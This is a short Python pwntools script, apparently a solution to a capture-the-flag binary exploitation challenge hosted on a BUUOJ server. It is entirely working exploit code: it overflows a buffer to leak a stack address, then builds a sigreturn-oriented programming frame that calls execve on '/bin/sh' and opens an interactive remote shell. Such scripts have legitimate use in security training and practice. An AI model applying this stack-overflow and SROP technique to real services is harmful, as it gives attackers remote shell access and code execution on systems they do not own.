from pwn import *

context.arch = 'amd64'
p = remote('node3.buuoj.cn', 29732)
set_rax_15 = 0x4004DA
rw = 0x4004F1
syscall_ret = 0x400517

payload = b'/bin/sh\x00' + b'a' * 0x8 + p64(rw)

p.send(payload)

p.recv(32)
sh_address = u64(p.recv(8)) - 0x118  # leak stack

p.recv(8)
# init srop
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = sh_address
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
# second read
payload = b'a' * 0x10 + p64(set_rax_15) + p64(syscall_ret) + bytes(frame)
p.send(payload)
p.recv(48)
p.interactive()
